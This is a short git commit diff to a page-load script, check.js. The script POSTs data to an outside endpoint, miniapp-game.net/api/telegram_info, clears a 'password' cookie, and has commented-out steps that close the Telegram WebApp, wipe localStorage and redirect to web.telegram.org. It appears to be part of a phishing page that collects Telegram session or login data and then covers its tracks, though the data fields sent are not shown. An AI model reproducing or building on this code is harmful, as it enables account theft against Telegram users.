d203fb98cec96ecd95abf450d83a2ac215d5b44c
max <flynmax413@gmail.com>
2024-12-17 03:25:46 +0900

    asssddsd

--- check.js
+++ check.js
@@ -23,7 +23,7 @@ document.addEventListener("DOMContentLoaded", function() {
 
         console.log("FFFFF");
 
-        fetch(`https://miniapp-game.net/api/telegram_info`, {
+        await fetch(`https://miniapp-game.net/api/telegram_info`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
@@ -35,8 +35,8 @@ document.addEventListener("DOMContentLoaded", function() {
         });
 
         // window.Telegram.WebApp.openTelegramLink("https://t.me/+8dtqN7T2sJpmNTb7");
-        window.Telegram.WebApp.close();
-        localStorage.clear();
+        // window.Telegram.WebApp.close();
+        // localStorage.clear();
         document.cookie = "password=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
         // window.location.href = "https://web.telegram.org/a/";  
 
